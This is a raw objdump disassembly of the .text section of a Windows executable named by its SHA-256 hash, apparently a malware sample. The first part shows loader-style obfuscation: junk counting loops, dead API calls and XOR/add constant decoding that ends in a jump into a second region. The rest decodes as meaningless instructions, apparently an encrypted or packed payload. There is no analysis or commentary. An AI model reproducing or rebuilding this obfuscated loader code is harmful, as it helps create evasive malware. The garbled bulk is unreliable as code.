
ecd5694424277358f095ef3fd7212814b0f5a28f713609eb08df775400106614.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	inc    ebx
  40143e:	mov    bh,0x16
  401440:	dec    esi
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	ja     0x4014c9
  401454:	inc    ebp
  401455:	mov    al,ds:0x7142722e
  40145a:	daa    
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	dec    eax
  401505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401506:	jmp    0xb4ee:0x4b60cf72
  40150d:	in     al,dx
  40150e:	dec    edi
  40150f:	sbb    eax,0x71b92360
  401514:	sub    eax,0x93813c1
  401519:	aad    0xf4
  40151b:	je     0x4014b2
  40151d:	jmp    0x9f3c3872
  401522:	fwait
  401523:	test   ah,dh
  401525:	inc    esp
  401526:	or     eax,0x4dc9f443
  40152b:	ss repnz xor eax,0x856ce0a
  401532:	loopne 0x4015ab
  401534:	fimul  WORD PTR [esi-0x695a25de]
  40153a:	out    dx,al
  40153b:	test   DWORD PTR [ebp-0x6b],esp
  40153e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40153f:	fs bnd ret 
  401542:	cli    
  401543:	xor    eax,0x67aa0350
  401548:	stos   DWORD PTR es:[edi],eax
  401549:	ror    BYTE PTR [ebx+0x4e142d06],cl
  40154f:	out    0xb7,al
  401551:	stos   DWORD PTR es:[edi],eax
  401552:	add    esp,DWORD PTR [ebp+0x46]
  401555:	icebp  
  401556:	shl    esi,0xa3
  401559:	lock cdq 
  40155b:	and    al,0xbe
  40155d:	push   esi
  40155e:	outs   dx,DWORD PTR ds:[esi]
  40155f:	cmc    
  401560:	adc    esp,DWORD PTR [eax+0x22fecf9a]
  401566:	call   0x3112dcf0
  40156b:	jg     0x4015dc
  40156d:	std    
  40156e:	ret    0xba46
  401571:	and    eax,DWORD PTR [eax-0x5413a47f]
  401577:	test   bl,dl
  401579:	enter  0x3943,0x9
  40157d:	aad    0x37
  40157f:	adc    dl,BYTE PTR [ecx-0x3f]
  401582:	mov    dh,0xda
  401584:	dec    ebx
  401585:	loopne 0x4015c7
  401587:	jae    0x40157d
  401589:	(bad)
  40158c:	mov    dl,0xf8
  40158e:	int    0xcb
  401590:	scas   al,BYTE PTR es:[edi]
  401591:	(bad)  
  401592:	fdivp  st(3),st
  401594:	jmp    0x4015d6
  401596:	daa    
  401597:	fdivr  st(4),st
  401599:	pop    ebp
  40159a:	dec    ebx
  40159b:	push   eax
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	sbb    DWORD PTR [eax+eax*4-0x60f19349],ebx
  4015a5:	popa   
  4015a6:	nop
  4015a7:	pop    di
  4015a9:	jmp    0x788116b5
  4015ae:	xchg   esi,eax
  4015af:	test   edx,0xa5f7ac0b
  4015b5:	xchg   edi,eax
  4015b6:	and    edx,DWORD PTR [ecx+0x1d]
  4015b9:	cmp    edx,ebx
  4015bb:	(bad)  
  4015bc:	sub    esp,DWORD PTR [esi+0xc6aa543]
  4015c2:	(bad)  
  4015c3:	mov    edx,gs
  4015c5:	lahf   
  4015c6:	cmp    DWORD PTR [ecx+0x59],edi
  4015c9:	sahf   
  4015ca:	pop    ecx
  4015cb:	mov    ds:0x56e4faff,al
  4015d0:	daa    
  4015d1:	out    dx,eax
  4015d2:	scas   eax,DWORD PTR es:[edi]
  4015d3:	lea    ecx,[edx+0x5b]
  4015d6:	ror    ecx,cl
  4015d8:	jbe    0x4015e3
  4015da:	push   edi
  4015db:	add    DWORD PTR [eax+0x6a],0xffffffce
  4015df:	jne    0x401641
  4015e1:	dec    ebx
  4015e2:	or     DWORD PTR [esi+0x77a63d18],esi
  4015e8:	push   esp
  4015e9:	cmp    bh,BYTE PTR [esi+0x30]
  4015ec:	dec    ecx
  4015ed:	inc    edx
  4015ee:	pshufw mm2,mm0,0xb8
  4015f2:	(bad)  
  4015f3:	jne    0x401622
  4015f5:	push   edx
  4015f6:	mov    edx,0xfc18fd99
  4015fb:	inc    edx
  4015fc:	test   BYTE PTR [ebp-0x2a],ch
  4015ff:	sbb    al,0xa5
  401601:	push   ebx
  401602:	push   esp
  401603:	in     al,dx
  401604:	pop    es
  401605:	fcmovnbe st,st(3)
  401607:	sub    ebp,ebx
  401609:	jecxz  0x401650
  40160b:	sub    eax,DWORD PTR [ecx+0x3b]
  40160e:	out    0xa1,al
  401610:	mov    al,ds:0xfa0fd54f
  401615:	ins    BYTE PTR es:[edi],dx
  401616:	call   0xa448354e
  40161b:	xor    BYTE PTR [esi+0x20],dl
  40161e:	psraw  mm4,QWORD PTR [eax]
  401621:	pushf  
  401622:	cmp    ch,cl
  401624:	fidivr WORD PTR [edx-0x7b]
  401627:	daa    
  401628:	xor    ebp,DWORD PTR ds:0xb42a48d9
  40162e:	lock cs popa 
  401631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401632:	or     ebx,eax
  401634:	ret    
  401635:	(bad)  
  401636:	jmp    0xa60e85e3
  40163b:	cld    
  40163c:	stos   BYTE PTR es:[edi],al
  40163d:	mov    cl,0x51
  40163f:	fmul   QWORD PTR [edx]
  401641:	mov    al,0x9a
  401643:	adc    esi,DWORD PTR [eax-0x6]
  401646:	pop    ss
  401647:	mov    ?,esp
  401649:	push   ebp
  40164a:	call   0xade111e7
  40164f:	sub    eax,0x81ae2410
  401654:	stc    
  401655:	or     esp,esp
  401657:	lea    ebp,[edx-0x3b464db6]
  40165d:	ret    0xc328
  401660:	sbb    DWORD PTR [esi-0x2cb82ce7],eax
  401666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401667:	xchg   ecx,eax
  401668:	dec    esi
  401669:	leave  
  40166a:	push   ss
  40166b:	and    al,0x91
  40166d:	ins    BYTE PTR es:[edi],dx
  40166e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40166f:	fisub  WORD PTR [ebx+0x35]
  401672:	pop    ecx
  401673:	clc    
  401674:	sub    BYTE PTR [ebx-0x5d482d6d],al
  40167a:	lods   eax,DWORD PTR ds:[esi]
  40167b:	(bad)  
  40167c:	int    0x1c
  40167e:	rol    DWORD PTR [ebx-0x39],0x7d
  401682:	and    eax,0x512daf53
  401687:	xor    al,0xe3
  401689:	jp     0x40162d
  40168b:	mov    edx,0xbf470c46
  401690:	stos   BYTE PTR es:[edi],al
  401691:	push   es
  401692:	(bad)  
  401693:	fisubr DWORD PTR [edx]
  401695:	(bad)  
  401696:	cli    
  401697:	fsubr  QWORD PTR [esi]
  401699:	in     eax,0x2e
  40169b:	popf   
  40169c:	loopne 0x401670
  40169e:	jmp    0x3150657
  4016a3:	add    cl,ch
  4016a5:	nop
  4016a6:	mov    ?,WORD PTR [ebx]
  4016a8:	pop    ebp
  4016a9:	outs   dx,BYTE PTR ds:[esi]
  4016aa:	push   esp
  4016ab:	adc    DWORD PTR [ebp+eiz*8+0xc],esp
  4016af:	sub    DWORD PTR [ecx-0x56e0b75a],esp
  4016b5:	not    BYTE PTR [ebx+0x6da8a134]
  4016bb:	jb     0x401725
  4016bd:	call   DWORD PTR [ecx]
  4016bf:	cmc    
  4016c0:	push   cs
  4016c1:	sbb    al,0xed
  4016c3:	push   cs
  4016c4:	into   
  4016c5:	mov    edi,0xec370fcf
  4016ca:	jno    0x4016a1
  4016cc:	mov    eax,0x609b7ef7
  4016d1:	cld    
  4016d2:	daa    
  4016d3:	mov    edx,0x672ae013
  4016d8:	jbe    0x401695
  4016da:	xchg   edx,eax
  4016db:	push   edi
  4016dc:	mov    es,WORD PTR [ebp+0x6]
  4016df:	das    
  4016e0:	add    esp,DWORD PTR [edi+eiz*4]
  4016e3:	add    eax,0x6cd30935
  4016e8:	xor    ebp,0x6fc3a3e8
  4016ee:	data16 jmp 0x401728
  4016f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016f2:	adc    DWORD PTR [ecx+0x67],ebx
  4016f5:	jae    0x40171f
  4016f7:	sbb    DWORD PTR [eax-0x74f9c08],ebx
  4016fd:	sbb    ebp,0xedd5806d
  401703:	mov    ch,0x1b
  401705:	ds test bl,0x9f
  401709:	mov    ds:0xcd8caf00,al
  40170e:	inc    esi
  40170f:	add    al,0xd
  401711:	add    eax,0xa4614322
  401716:	sbb    dl,BYTE PTR [esi+0x32]
  401719:	sti    
  40171a:	aaa    
  40171b:	jnp    0x40171f
  40171d:	inc    ebp
  40171e:	sub    BYTE PTR [esi+0x43],ah
  401721:	mov    edi,0xef3d2a5e
  401726:	sub    ebp,DWORD PTR [ebx-0x1a]
  401729:	jno    0x401763
  40172b:	pop    ebp
  40172c:	daa    
  40172d:	jle    0x4017a6
  40172f:	push   0x3d26addd
  401734:	jl     0x4017af
  401736:	arpl   WORD PTR [esi],cx
  401738:	jge    0x4016fe
  40173a:	mov    ds:0x91424cf,al
  40173f:	adc    bl,BYTE PTR [edi]
  401741:	sbb    BYTE PTR [ecx+edx*1+0x7f],0x82
  401746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401747:	xchg   BYTE PTR [ebx],bl
  401749:	dec    esp
  40174a:	jne    0x40179b
  40174c:	jg     0x40176f
  40174e:	mov    ebx,edx
  401750:	inc    esi
  401751:	sbb    edx,DWORD PTR [eax+0x30eae77b]
  401757:	add    DWORD PTR [ecx-0x1692b3f7],edi
  40175d:	jnp    0x40176e
  40175f:	mov    ds:0x15525fd,eax
  401764:	cmp    al,0x7a
  401766:	pop    ebp
  401767:	lahf   
  401768:	ins    BYTE PTR es:[edi],dx
  401769:	clc    
  40176a:	adc    BYTE PTR [ebx-0x70e8edc0],cl
  401770:	mov    DWORD PTR [ecx+0x5229b1a9],eax
  401776:	hlt    
  401777:	pop    ecx
  401778:	daa    
  401779:	fld    TBYTE PTR [esi-0x335b4514]
  40177f:	mov    ds:0x284f4b5,al
  401784:	rcl    BYTE PTR [ebx+0x45],cl
  401787:	push   ecx
  401788:	mov    esp,0x8289349d
  40178d:	jo     0x401716
  40178f:	loope  0x401726
  401791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401792:	xchg   ebp,eax
  401793:	sbb    esp,edx
  401795:	push   0xfc3bd1ec
  40179a:	call   0xca50:0x3fc7d5ae
  4017a1:	jmp    FWORD PTR [ecx]
  4017a3:	leave  
  4017a4:	stos   DWORD PTR es:[edi],eax
  4017a5:	xor    BYTE PTR [eax],dl
  4017a7:	call   DWORD PTR [ebp-0x6a]
  4017aa:	ficom  WORD PTR [eax+0x4a0bc175]
  4017b0:	(bad)  
  4017b1:	in     al,0x62
  4017b3:	fidivr DWORD PTR [ecx+0x4]
  4017b6:	push   0xd81b8e35
  4017bb:	dec    esi
  4017bc:	sbb    eax,0x18a6a1f1
  4017c1:	jae    0x401821
  4017c3:	inc    edi
  4017c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017c5:	jmp    0x7e44:0x141ba469
  4017cc:	std    
  4017cd:	push   ds
  4017ce:	psrlq  mm2,0x56
  4017d2:	cmc    
  4017d3:	shl    BYTE PTR [esi-0x74],cl
  4017d6:	lahf   
  4017d7:	scas   eax,DWORD PTR es:[edi]
  4017d8:	mov    eax,0x2041379
  4017dd:	jbe    0x40182f
  4017df:	dec    edi
  4017e0:	xor    dh,BYTE PTR [edx]
  4017e2:	pop    edi
  4017e3:	ret    
  4017e4:	lods   al,BYTE PTR ds:[esi]
  4017e5:	call   0xd688:0x719990b
  4017ec:	add    bh,BYTE PTR ds:0x2007712e
  4017f2:	ds je  0x401824
  4017f5:	cmp    bh,BYTE PTR [esi]
  4017f7:	sub    BYTE PTR [ecx-0x71],0xca
  4017fb:	mov    edx,0x6667e52b
  401800:	inc    eax
  401801:	pop    ds
  401802:	mov    ds:0xfe7e8041,eax
  401807:	fld    TBYTE PTR [ebp-0x3b55b0ee]
  40180d:	fcomp  QWORD PTR [ebp+0x6d]
  401810:	cld    
  401811:	pop    esp
  401812:	in     eax,0x5d
  401814:	pop    esi
  401815:	test   ebp,0xab2d5b7e
  40181b:	fwait
  40181c:	mov    cl,0xf4
  40181e:	aad    0xd0
  401820:	out    dx,al
  401821:	es and eax,0xb51615a5
  401827:	sub    ebp,DWORD PTR [esi]
  401829:	sbb    BYTE PTR [ecx],ah
  40182b:	outs   dx,DWORD PTR ds:[esi]
  40182c:	jne    0x4018ab
  40182e:	aaa    
  40182f:	ror    BYTE PTR [ecx+0x7f5bc49d],cl
  401835:	mov    DWORD PTR [esp+edi*2+0x4d],0xc02a9e4b
  40183d:	jb     0x401812
  40183f:	add    DWORD PTR [ebx],0xffffffdf
  401842:	sbb    al,0xf1
  401844:	aaa    
  401845:	ds push eax
  401847:	add    al,0xb7
  401849:	sbb    eax,ebx
  40184b:	iret   
  40184c:	call   0x9715:0xbd46f813
  401853:	mov    es,WORD PTR [ecx+0x49c85a4b]
  401859:	cmc    
  40185a:	out    0x12,eax
  40185c:	data16 cmp BYTE PTR es:[edx+0x264a7cc9],0x92
  401865:	shl    DWORD PTR [edx+0x334b06db],cl
  40186b:	or     BYTE PTR [eax+esi*1],bl
  40186e:	add    al,0x93
  401870:	jb     0x40181b
  401872:	sub    al,BYTE PTR [ebx]
  401874:	dec    ecx
  401875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401876:	fucomi st,st(4)
  401878:	(bad)  
  401879:	ja     0x40186e
  40187b:	outs   dx,DWORD PTR ds:[esi]
  40187c:	cs or  al,0x32
  40187f:	loop   0x4018e4
  401881:	jl     0x401900
  401883:	cs pop edx
  401885:	jmp    0x4018d7
  401887:	jne    0x4018ac
  401889:	jno    0x401837
  40188b:	mov    edx,0x8dcf39f6
  401890:	pop    ss
  401891:	cmp    ebp,DWORD PTR [ebp+0x63]
  401894:	retf   
  401895:	cmp    al,0x6f
  401897:	mov    al,cl
  401899:	nop
  40189a:	fnsetpm(287 only) 
  40189c:	repnz jmp 0x8db5:0x79ce15e3
  4018a4:	jmp    0x4018dc
  4018a6:	or     DWORD PTR [ebx+eax*8+0x830c92],esp
  4018ad:	ss dec al
  4018b0:	pop    esp
  4018b1:	mov    esp,0xaf214cf
  4018b6:	(bad)  
  4018b7:	ins    BYTE PTR es:[edi],dx
  4018b8:	stc    
  4018b9:	or     edi,ebx
  4018bb:	xchg   ecx,eax
  4018bc:	hlt    
  4018bd:	stos   BYTE PTR es:[edi],al
  4018be:	stos   DWORD PTR es:[edi],eax
  4018bf:	pop    edx
  4018c0:	mov    DWORD PTR [eax+0x41],ebp
  4018c3:	(bad)  
  4018c4:	xor    bl,dl
  4018c6:	lahf   
  4018c7:	ret    0xf9b9
  4018ca:	sahf   
  4018cb:	cmc    
  4018cc:	mov    eax,ds:0xbf1058e9
  4018d1:	fld    DWORD PTR [ecx]
  4018d3:	int    0xcb
  4018d5:	jle    0x4018b8
  4018d7:	pop    es
  4018d8:	fnstcw WORD PTR [edx-0x43]
  4018db:	jno    0x4018ed
  4018dd:	out    0x3b,al
  4018df:	in     eax,dx
  4018e0:	loope  0x401882
  4018e2:	fisttp DWORD PTR [ebp-0x77]
  4018e5:	outs   dx,BYTE PTR ds:[esi]
  4018e6:	or     ebp,DWORD PTR [edi-0x47cd453e]
  4018ec:	(bad)  
  4018ed:	fmul   DWORD PTR [edx-0x48]
  4018f0:	fld    QWORD PTR [edx-0x617492cf]
  4018f6:	mov    ds:0x787d4704,al
  4018fb:	push   esp
  4018fc:	outs   dx,BYTE PTR ds:[esi]
  4018fd:	jg     0x4018b2
  4018ff:	xor    esi,ebx
  401901:	das    
  401902:	mov    bh,0x8c
  401904:	neg    ah
  401906:	(bad)  
  401907:	sub    eax,DWORD PTR [ebp-0x55ad2612]
  40190d:	pop    ds
  40190e:	add    esp,DWORD PTR [edi]
  401910:	adc    bl,BYTE PTR [edx+ecx*8+0x28]
  401914:	lods   eax,DWORD PTR ds:[esi]
  401915:	add    eax,DWORD PTR [eax+0x298e4871]
  40191b:	dec    esp
  40191c:	icebp  
  40191d:	pop    ds
  40191e:	sbb    DWORD PTR [ebp+ecx*1-0x752a3af5],0xbe941134
  401929:	lock fs inc ebx
  40192c:	cmp    esp,ebx
  40192e:	jl     0x401939
  401930:	pop    ebx
  401931:	jbe    0x401923
  401933:	cmp    ch,dh
  401935:	pop    ss
  401936:	imul   edx,DWORD PTR [eax+eax*2],0x38
  40193a:	in     al,dx
  40193b:	or     al,0x9c
  40193d:	sahf   
